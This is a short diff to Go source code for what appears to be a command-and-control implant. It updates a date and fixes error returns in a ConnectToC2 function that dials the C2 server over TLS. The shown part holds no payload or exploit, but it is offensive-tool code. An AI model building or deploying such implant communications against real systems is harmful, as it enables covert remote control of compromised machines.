@@ -5,7 +5,7 @@ package main
  * Comms between the implant and server.
  * By J. Stuart McMurray
  * Created 20220327
- * Last Modified 20220329
+ * Last Modified 20220331
  */
 
 import (
@@ -55,12 +55,11 @@ func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error)
 		/* Work out the hostname. */
 		h, _, err := net.SplitHostPort(ServerAddr)
 		if nil != err {
-			return _, _, _, fmt.Errorf(
+			return nil, nil, nil, fmt.Errorf(
 				"Error extracting hostname from %q: %s",
 				ServerAddr,
 				err,
 			)
-			os.Exit(1)
 		}
 		c, err = tls.Dial("tcp", ServerAddr, &tls.Config{
 			ServerName: h,
